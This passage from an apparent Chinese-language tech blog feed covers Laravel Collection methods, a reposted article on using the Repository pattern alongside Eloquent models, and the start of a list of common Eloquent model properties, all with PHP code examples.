150],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>类似方法还有<code>whereNotIn</code>、<code>whereBetween</code>、<code>whereNotInStrict</code>。</p><h2 id="whereBetween"><a href="#whereBetween" class="headerlink" title="whereBetween"></a>whereBetween</h2><p>筛选指定范围内的集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Desk'</span>, <span class="string">'price'</span> =&gt; <span class="number">200</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Chair'</span>, <span class="string">'price'</span> =&gt; <span class="number">80</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Bookcase'</span>, <span class="string">'price'</span> =&gt; <span class="number">150</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Pencil'</span>, <span class="string">'price'</span> =&gt; <span class="number">30</span>],</span><br><span class="line">    [<span class="string">'product'</span> =&gt; <span class="string">'Door'</span>, <span class="string">'price'</span> =&gt; <span class="number">100</span>],</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$filtered = $collection-&gt;whereBetween(<span class="string">'price'</span>, [<span class="number">100</span>, <span class="number">200</span>]);</span><br><span class="line">$filtered-&gt;all();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    [</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Desk', 'price' =&gt; 200],</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Bookcase', 'price' =&gt; 150],</span></span><br><span class="line"><span class="comment">        ['product' =&gt; 'Door', 'price' =&gt; 100],</span></span><br><span class="line"><span class="comment">    ]</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>将给定数组的值与相应索引处的原集合的值合并在一起。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$collection = collect([<span class="string">'Chair'</span>, <span class="string">'Desk'</span>]);</span><br><span class="line"></span><br><span class="line">$zipped = $collection-&gt;zip([<span class="number">100</span>, <span class="number">200</span>]);</span><br><span class="line">$zipped-&gt;all();     <span class="comment">// [['Chair', 100], ['Desk', 200]]</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://curder.gitbooks.io/laravel_study/content/collections/" target="_blank" rel="noopener">Laravel 的集合 Collection</a></li><li><a href="https://learnku.com/docs/laravel/8.x/collections/9390" target="_blank" rel="noopener">Laravel 集合——Laravel8.x 中文文档</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;集合是Laravel 中提供的最强大的功能之一，集合本质上是由功能强大的数组组成。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>『转载』如何使用Repository 模式</title>
    <link href="https://www.0x2beace.com/how-to-use-repository-mode/"/>
    <id>https://www.0x2beace.com/how-to-use-repository-mode/</id>
    <published>2021-04-20T13:01:38.000Z</published>
    <updated>2021-04-22T15:22:30.359Z</updated>
    
    <content type="html"><![CDATA[<p>若将数据库逻辑都写在 Model 里，会造成 model 代码的臃肿难以维护，基于 <strong>SOLID</strong> 原则，我们应该使用 <strong>Repository</strong> 模式辅助 Model，将相关的数据库逻辑封装在不同的 Repository，方便后期项目的维护。</p><a id="more"></a><h2 id="数据库逻辑"><a href="#数据库逻辑" class="headerlink" title="数据库逻辑"></a>数据库逻辑</h2><p>在 CURD 中，CUR 比较稳定，但 Read 的部分则变化万千，大部分的数据库逻辑都在描述 Read 部分，若将数据库逻辑写在 Controller 或 Model 都不合适，会造成 Controller 或 Model 代码臃肿，如后难以维护。</p><h2 id="Model"><a href="#Model" class="headerlink" title="Model"></a>Model</h2><p>使用 Repository 模式之后，Model 仅仅当成 Eloquent Class 即可，不需要包含数据库逻辑，仅保留如下部分：</p><ul><li>Property： 如 <code>$table</code>、<code>$fillable</code> …</li><li>Mutator： 包括 mutator 与 accessor</li><li>Method： relation 类的方法，比如使用 <code>hasMany()</code> 与 <code>belongsTo()</code></li></ul><p>单一对应关系：</p><ul><li>hasOne</li><li>belongsTo</li><li>morphTo</li><li>morphOne</li></ul><p>多个对应关系指的是使用以下关键词定义的关联模型：</p><ul><li>hasMany</li><li>belongsToMany</li><li>morphMany</li><li>morphToMany</li><li>morphedByMany</li></ul><h2 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h2><p>在开发时常常会在 Controller 直接调用 Model 写数据库逻辑，如下：获取数据库中用户 <code>age&gt;20</code> 的数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> User::where(<span class="string">'age'</span>,<span class="string">'&gt;'</span>,<span class="number">20</span>)-&gt;orderBy(<span class="string">'age'</span>)-&gt;get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样写逻辑会有几个问题：</p><ul><li>将数据库逻辑写在 Controller，造成 Controller 代码臃肿难以维护。</li><li>违反了 SOLID 的单一职责原则，数据库逻辑不应该写在 Controller 中。</li><li>Controller 直接操作 Model，使得对 Controller 做单元测试困难。</li></ul><p>比较好的方式是使用 Repository：</p><ul><li>将 Model 依赖注入到 Repository。</li><li>将数据库逻辑写在 Repository。</li><li>将 Repository 依赖注入到 Service。</li></ul><p><code>app/Repositories/UserRepostitory.php</code> 中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Repositories</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class UserRepository</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Repositories</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserRepository</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> User</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $user;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * UserRepository constructor.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $user</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(User $user)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $age</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Database\Eloquent\Collection|static[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAgeLargerThan</span><span class="params">($age)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user</span><br><span class="line">            -&gt;where(<span class="string">'age'</span>, <span class="string">'&gt;'</span>, $age)</span><br><span class="line">            -&gt;orderBy(<span class="string">'age'</span>)</span><br><span class="line">            -&gt;get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在控制器<code>app\Controllers\UserController.php</code> 中使用依赖注入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Repositories</span>\<span class="title">UserRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class UserController</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Http\Controllers</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> \App\Repositories\UserRepository</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * UserController constructor.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $userRepository</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(UserRepository $userRepository)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userRepository = $userRepository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Database\Eloquent\Collection|static[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;userRepository-&gt;getAgeLargerThan(<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将相依的 <code>UserRepository</code> 依賴注入到 <code>UserController</code>，并从原本直接依赖 <code>User Model</code> 改成依赖注入的 <code>UserRepository</code>。</p><p>优点：</p><ul><li>将数据库逻辑写在 Repository 里，解决了 Controller 代码臃肿的问题。</li><li>符合 SOLID 的单一职责原则：数据库逻辑写在 Repository 里，没写在 Controller 里。</li><li>符合 SOLID 的依赖反转原则：Controller 并非直接相依与 Repositroy，而是将 Repository 依赖注入进 Controller。</li></ul><blockquote><p>注意⚠️：实际上建议 Repository 仅依赖注入进 Service，而不是直接注入在 Controller。</p></blockquote><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="是否该建立-Repository-Interface？"><a href="#是否该建立-Repository-Interface？" class="headerlink" title="是否该建立 Repository Interface？"></a>是否该建立 Repository Interface？</h3><p>理论上使用依赖注入时，应该使用 Interface ，不过 Interface 目的在于更换数据库，让代码达到开放封闭的要求，但是实际上要更改 Reposiroty 的机会也不多，除非是从 MySQL 更换到 MongoDB，此时就应该建立 Repository Interface。<br>不过由于我们使用了依赖注入，将来要从 Class 改成 Interface 也很方便，只要在 Constructor 的 type hint 改成 Interface 即可，维护成本很低，所以在此大可使用 Repository Class 即可，不一定得用Interface而造成 Over Design，等真正需要修改时，再重构 Interface 即可。</p><h3 id="是否该使用-Query-Scope"><a href="#是否该使用-Query-Scope" class="headerlink" title="是否该使用 Query Scope?"></a>是否该使用 Query Scope?</h3><p>Laravel 4.2 就有 QueryScope，到后面的版本也都还保留着，它让我们可以将逻辑代码写在 Model ，解决了维护与重复使用的问题。<br>如 app/User.php 里的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Notifications</span>\<span class="title">Notifiable</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Auth</span>\<span class="title">User</span> <span class="title">as</span> <span class="title">Authenticatable</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * App\User</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@mixin</span> \Eloquent</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Authenticatable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Notifiable</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The attributes that are mass assignable.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $fillable = [</span><br><span class="line">        <span class="string">'name'</span>, <span class="string">'email'</span>, <span class="string">'password'</span>,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The attributes that should be hidden for arrays.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $hidden = [</span><br><span class="line">        <span class="string">'password'</span>, <span class="string">'remember_token'</span>,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Builder $query</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> integer $age</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Builder</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">scopeGetAgerLargerThan</span><span class="params">($query, $age)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $query-&gt;where(<span class="string">'age'</span>, <span class="string">'&gt;'</span>, $age)</span><br><span class="line">            -&gt;orderBy(<span class="string">'age'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>QueryScope 必须以 scope开头，第一个参数为 queryBuilder，一定要加上；第二个参数以后为自己要传入的参数。<br>由于回传必须是一个 queryBuilder ，因此不需要加上 <code>get()</code>，在<br><code>app/Controllers/UserController.php</code> 中使用代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Repositories</span>\<span class="title">UserRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">User</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class UserController</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Http\Controllers</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> \App\Repositories\UserRepository</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * UserController constructor.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $userRepository</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(UserRepository $userRepository)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userRepository = $userRepository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Database\Eloquent\Collection|static[]</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> User::getAgerLargerThan(<span class="number">20</span>)-&gt;get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Controller 中使用 QueryScope 时，不需要加上 Prefix，由于其本质是 queryBuilder，所以还要加上 get() 才能获得 Conllection 数据。</p><p>由于 QueryScope 是写在 Model，不是写在 Controller，所以基本上解决了 Controller 臃肿违反 SOLID 的单一职责原则的问题， Controller 也可以重复使用 QueryScope ，已经比直接将资料库逻辑写在 Controlelr 中好很多。<br>不过若在中大型项目中，仍然有以下问题：</p><ul><li>Model 已经有原来的责任，若再加上 queryScope，造成 Model 过于臃肿难以维护。</li><li>若数据库逻辑很多，可能拆成多个 Repository，可是确很难拆成多个 Model。</li><li>单元测试困难，必须面临 mock Eloquent 的问题。</li></ul><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>实际开发时，可以一开始 1 个 Repository 对应 1 个 Model，但是也不必太过执着于 1 个 Repository，一定要对应 1 个 Model，可将 Repository 视为逻辑上的数据库逻辑类别即可，可以横跨多个Model处理，也可以 1 个 Model 拆成多个 Repository，视情况而定。<br>Repository 使得数据库逻辑从 Controller 或 Model 中解放，不仅更容易维护、更容易拓展、更容易重复使用，也更容易测试。</p><hr><h2 id="是否需要使用-Repository-？"><a href="#是否需要使用-Repository-？" class="headerlink" title="是否需要使用 Repository ？"></a>是否需要使用 Repository ？</h2><p>倒底该不该用Repository，对于这个问题，从未停止过讨论。我认为没有绝对的用或者不用，需要根据项目实际情况而定。</p><p>结合自己的一些项目经验，我的理解是：对于小项目而言，复杂查询并不多，直接使用ORM效率更高，前期快速开发才是关键，过早使用Repository 反而会造成过度设计; 而对于起步本身就是中大型项目，则可以考虑使用Repository 将复杂的查询和业务逻辑分开。</p><p>单一职责原则：</p><ul><li>Request 负责表单验证</li><li>Model 负责维护ORM</li><li>Controller 负责获取请求参数</li><li>Service 负责处理业务逻辑</li><li>Repository 负责从数据库里取数据</li></ul><p>这里有两个讨论很精彩：<a href="https://learnku.com/laravel/t/16338" target="_blank" rel="noopener">绝不 使用 Repository??</a>、<a href="https://learnku.com/laravel/t/10323/never-use-repository" target="_blank" rel="noopener">绝不 使用 Repository?</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;若将数据库逻辑都写在 Model 里，会造成 model 代码的臃肿难以维护，基于 &lt;strong&gt;SOLID&lt;/strong&gt; 原则，我们应该使用 &lt;strong&gt;Repository&lt;/strong&gt; 模式辅助 Model，将相关的数据库逻辑封装在不同的 Repository，方便后期项目的维护。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/categories/PHP/Laravel/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Laravel" scheme="https://www.0x2beace.com/tags/Laravel/"/>
    
  </entry>
  
  <entry>
    <title>Laravel Eloquent 常用属性整理</title>
    <link href="https://www.0x2beace.com/laravel-eloquent-common-attributes-sorting/"/>
    <id>https://www.0x2beace.com/laravel-eloquent-common-attributes-sorting/</id>
    <published>2021-04-14T15:11:13.000Z</published>
    <updated>2021-04-19T00:13:27.036Z</updated>
    
    <content type="html"><![CDATA[<p>Eloquent 提供了很多属性，通过对模型进行约定，可以实现很多很方便的功能。</p><a id="more"></a><h3 id="connection"><a href="#connection" class="headerlink" title="connection"></a>connection</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为模型指定一个连接名称</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $connection = <span class="string">'connection-name'</span>;</span><br></pre></td></tr></table></figure><h3 id="table"><a href="#table" class="headerlink" title="table"></a>table</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为模型指定一个表名</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">protected</span> $table = <span class="string">'users'</span>;</span><br></pre></td></tr></table></figure><h3 id="primaryKey"><a href="#primaryKey" class="headerlink" title="primaryKey"></a>primaryKey</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为模型指定主键</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">protected</span> $primaryKey = <span class="string">'user_id'</span>;</span><br></pre></td></tr></table></figure><h3 id="incrementing"><a href="#incrementing" class="headerlink" title="incrementing"></a>incrementing</h3><p>Eloquent 假设主键是一个自增的整数值，这意味着默认情况下主键会自动转换为 int 类型。</p><p>如果希望使用非递增或非数字的主键则需要设置公共的 <code>$incrementing</code> 属性设置为 false：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 如果使用的是非递增或者非数字的主键</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> $incrementing = <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure><h3 id="keyType"><a href="#keyType" class="headerlink" title="keyType"></a>keyType</h3><p>如果你的主键不是一个整数，你需要将模型上受保护的 <code>$keyType</code> 属性设置为 string：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义主键类型</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $keyType = <span class="string">'string'</span>;</span><br></pre></td></tr></table></figure><h3 id="timestamps"><a href="#timestamps" class="headerlink" title="timestamps"></a>timestamps</h3><p>默认情况下，Eloquent 预期你的数据表中存在<code>created_at</code> 和<code>updated_at</code> 字段，如果不想让 Eloquent 自动管理这两个列， 请将模型中的 $timestamps 属性设置为 false：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 是否主动维护时间戳</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> $timestamps = <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure><h3 